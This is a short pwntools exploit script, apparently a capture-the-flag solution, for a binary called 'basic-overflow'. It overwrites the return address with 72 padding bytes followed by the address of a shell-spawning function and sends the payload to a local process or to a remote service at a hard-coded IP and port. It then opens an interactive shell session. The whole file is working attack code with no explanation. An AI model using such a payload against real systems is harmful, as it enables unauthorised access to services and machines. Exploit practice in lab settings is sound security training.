#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    r = remote('34.123.15.202', 5000)
elif args.GDB:
    r = gdb.debug('./basic-overflow', 'b main')
else:
    r = process('./basic-overflow')

shell_func_addr = 0x401136

payload = b'A' * 72 + p64(shell_func_addr)

r.sendline(payload)
r.interactive()
